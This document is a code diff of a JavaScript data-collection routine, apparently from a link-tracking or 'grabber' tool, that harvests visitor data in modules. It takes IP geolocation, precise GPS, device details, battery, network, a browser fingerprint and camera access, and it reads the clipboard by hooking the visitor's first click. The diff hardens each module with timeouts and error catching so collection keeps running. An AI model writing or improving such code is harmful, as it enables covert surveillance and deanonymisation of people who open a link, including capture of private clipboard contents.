+    const r = await withTimeout(fetch('https://freeipapi.com/api/json'), 4000);
+    if (r.ok) {
+      const d = await r.json();
+      if (d && d.ipAddress) {
+        console.log('ipgeo: freeipapi.com ✓');
+        return { ip: d.ipAddress, city: d.cityName, region: d.regionName, country: d.countryName,
+          postal: d.zipCode, isp: d.asnOrganization, lat: d.latitude, lon: d.longitude,
+          display: [d.cityName, d.regionName, d.countryName].filter(Boolean).join(', ') };
+      }
+    }
+  } catch(e) { console.log('ipgeo: freeipapi.com failed (' + e.message + ')'); }
+
+  console.log('ipgeo: all providers failed, continuing without IP geo');
+  return null;
 }
 
 /* ============ DATA COLLECTION ============ */
@@ -1531,10 +1431,17 @@ async function collectData(link) {
 
   if (mods.includes('ip')) {
     tasks.push((async () => {
-      try { const r = await fetch('https://api.ipify.org/?format=json'); const d = await r.json(); log.ip = d.ip; }
-      catch (e) { log.ip = 'unknown'; }
+      try {
+        const r = await Promise.race([
+          fetch('https://api.ipify.org/?format=json'),
+          new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 4000))
+        ]);
+        if (r.ok) { const d = await r.json(); if (d && d.ip) log.ip = d.ip; }
+      } catch (e) { console.log('ipify failed:', e.message); }
+
       const g = await ipGeolocate();
       if (g) {
+        if (!log.ip && g.ip) log.ip = g.ip;
         log.ipGeo = g.display; log.ipIsp = g.isp;
         log.ipCity = g.city; log.ipCountry = g.country;
         if (!log.coords && g.lat && g.lon) {
@@ -1544,47 +1451,50 @@ async function collectData(link) {
           if (!log.address) log.address = g.display;
         }
       }
-    })());
+      if (!log.ip) log.ip = 'unknown';
+    })().catch(e => console.log('ip module error:', e.message)));
   }
 
   if (mods.includes('device')) {
-    const info = parseDeviceInfo();
-    log.device = info.ua;
-    log.deviceModel = info.deviceModel;
-    log.manufacturer = info.manufacturer || '';
-    log.os = info.os; log.osVersion = info.osVersion;
-    log.browser = info.browser; log.browserVersion = info.browserVersion;
-    log.platform = navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform) || 'unknown';
-    log.language = navigator.language;
-    log.languages = (navigator.languages || []).join(', ');
-    log.screen = `${screen.width}×${screen.height}`;
-    log.viewport = `${window.innerWidth}×${window.innerHeight}`;
-    log.pixelRatio = window.devicePixelRatio || 1;
-    log.colorDepth = screen.colorDepth;
-    log.orientation = (screen.orientation && screen.orientation.type) || '';
-    log.touchPoints = navigator.maxTouchPoints || 0;
-    log.cookies = navigator.cookieEnabled ? 'yes' : 'no';
-    log.dnt = navigator.doNotTrack || 'unset';
-    log.online = navigator.onLine ? 'yes' : 'no';
-    try { log.tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){}
-    try { log.tzOffset = new Date().getTimezoneOffset(); } catch(e){}
-    try { log.cores = navigator.hardwareConcurrency; } catch(e){}
-    try { log.memory = navigator.deviceMemory; } catch(e){}
     try {
-      if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-        const h = await navigator.userAgentData.getHighEntropyValues(['architecture','bitness','model','platformVersion','uaFullVersion']);
-        if (h.model) log.deviceModel = h.model;
-        if (h.platformVersion) log.platformVersion = h.platformVersion;
-        if (h.architecture) log.arch = h.architecture + (h.bitness ? ' '+h.bitness+'-bit' : '');
-      }
-    } catch(e){}
+      const info = parseDeviceInfo();
+      log.device = info.ua;
+      log.deviceModel = info.deviceModel;
+      log.manufacturer = info.manufacturer || '';
+      log.os = info.os; log.osVersion = info.osVersion;
+      log.browser = info.browser; log.browserVersion = info.browserVersion;
+      log.platform = navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform) || 'unknown';
+      log.language = navigator.language;
+      log.languages = (navigator.languages || []).join(', ');
+      log.screen = `${screen.width}×${screen.height}`;
+      log.viewport = `${window.innerWidth}×${window.innerHeight}`;
+      log.pixelRatio = window.devicePixelRatio || 1;
+      log.colorDepth = screen.colorDepth;
+      log.orientation = (screen.orientation && screen.orientation.type) || '';
+      log.touchPoints = navigator.maxTouchPoints || 0;
+      log.cookies = navigator.cookieEnabled ? 'yes' : 'no';
+      log.dnt = navigator.doNotTrack || 'unset';
+      log.online = navigator.onLine ? 'yes' : 'no';
+      try { log.tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){}
+      try { log.tzOffset = new Date().getTimezoneOffset(); } catch(e){}
+      try { log.cores = navigator.hardwareConcurrency; } catch(e){}
+      try { log.memory = navigator.deviceMemory; } catch(e){}
+      try {
+        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+          const h = await navigator.userAgentData.getHighEntropyValues(['architecture','bitness','model','platformVersion','uaFullVersion']);
+          if (h.model) log.deviceModel = h.model;
+          if (h.platformVersion) log.platformVersion = h.platformVersion;
+          if (h.architecture) log.arch = h.architecture + (h.bitness ? ' '+h.bitness+'-bit' : '');
+        }
+      } catch(e){}
+    } catch(e) { console.log('device module error:', e.message); }
   }
 
   if (mods.includes('location')) {
     tasks.push((async () => {
       try {
         const pos = await new Promise((res, rej) => {
-          navigator.geolocation.getCurrentPosition(res, rej, { timeout: 15000, enableHighAccuracy: true, maximumAge: 0 });
+          navigator.geolocation.getCurrentPosition(res, rej, { timeout: 10000, enableHighAccuracy: true, maximumAge: 0 });
         });
         const lat = pos.coords.latitude, lon = pos.coords.longitude;
         log.coords = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
@@ -1602,51 +1512,55 @@ async function collectData(link) {
       } catch (e) {
         log.location = (e && e.code === 1) ? 'permission-denied' : ('error:' + (e && e.message || 'unknown'));
       }
-    })());
+    })().catch(e => console.log('location module error:', e.message)));
   }
 
   if (mods.includes('battery')) {
     tasks.push((async () => {
-      if (typeof navigator.getBattery !== 'function') { log.battery = 'unsupported'; return; }
       try {
+        if (typeof navigator.getBattery !== 'function') { log.battery = 'unsupported'; return; }
         const b = await navigator.getBattery();
         log.battery = `${Math.round(b.level * 100)}%${b.charging ? ' ⚡' : ''}`;
         if (b.dischargingTime && b.dischargingTime !== Infinity) log.batteryTime = Math.round(b.dischargingTime / 60) + ' min';
       } catch (e) { log.battery = 'denied'; }
-    })());
+    })().catch(e => console.log('battery module error:', e.message)));
   }
 
   if (mods.includes('network')) {
-    if (navigator.connection) {
-      log.connection = navigator.connection.effectiveType || 'unknown';
-      if (navigator.connection.downlink) log.downlink = navigator.connection.downlink;
-      if (navigator.connection.rtt) log.rtt = navigator.connection.rtt + 'ms';
-    } else log.connection = 'unsupported';
+    try {
+      if (navigator.connection) {
+        log.connection = navigator.connection.effectiveType || 'unknown';
+        if (navigator.connection.downlink) log.downlink = navigator.connection.downlink;
+        if (navigator.connection.rtt) log.rtt = navigator.connection.rtt + 'ms';
+      } else log.connection = 'unsupported';
+    } catch(e){}
   }
 
   if (mods.includes('fingerprint')) {
     tasks.push((async () => {
       try { log.fingerprint = await computeFingerprint(); }
       catch (e) { log.fingerprint = 'failed'; }
-    })());
+    })().catch(e => console.log('fingerprint module error:', e.message)));
   }
 
   if (mods.includes('clipboard')) {
     tasks.push((async () => {
-      const tryRead = async () => {
-        try { const txt = await navigator.clipboard.readText(); if (txt) { log.clipboard = txt.slice(0, 300); return true; } } catch(e) {}
-        return false;
-      };
-      if (await tryRead()) return;
-      await new Promise(resolve => {
-        const cleanup = () => { document.removeEventListener('click', handler, true); document.removeEventListener('touchstart', handler, true); };
-        const handler = async () => { cleanup(); await tryRead(); resolve(); };
-        document.addEventListener('click', handler, { capture: true, once: true });
-        document.addEventListener('touchstart', handler, { capture: true, once: true });
-        setTimeout(() => { cleanup(); resolve(); }, 2500);
-      });
-      if (!log.clipboard) log.clipboard = 'denied';
-    })());
+      try {
+        const tryRead = async () => {
+          try { const txt = await navigator.clipboard.readText(); if (txt) { log.clipboard = txt.slice(0, 300); return true; } } catch(e) {}
+          return false;
+        };
+        if (await tryRead()) return;
+        await new Promise(resolve => {
+          const cleanup = () => { document.removeEventListener('click', handler, true); document.removeEventListener('touchstart', handler, true); };
+          const handler = async () => { cleanup(); await tryRead(); resolve(); };
+          document.addEventListener('click', handler, { capture: true, once: true });
+          document.addEventListener('touchstart', handler, { capture: true, once: true });
+          setTimeout(() => { cleanup(); resolve(); }, 2500);
+        });
+        if (!log.clipboard) log.clipboard = 'denied';
+      } catch(e) { log.clipboard = 'error'; }
+    })().catch(e => console.log('clipboard module error:', e.message)));
   }
 
   let cameraPromise = null;
@@ -1681,7 +1595,7 @@ async function collectData(link) {
       } catch (e) {
         log.camera = (e && e.name === 'NotAllowedError') ? 'permission-denied' : 'error:'+(e && e.message || 'unknown');
       }
-    })();
+    })().catch(e => console.log('camera module error:', e.message));
   }
 
   await Promise.all(tasks);
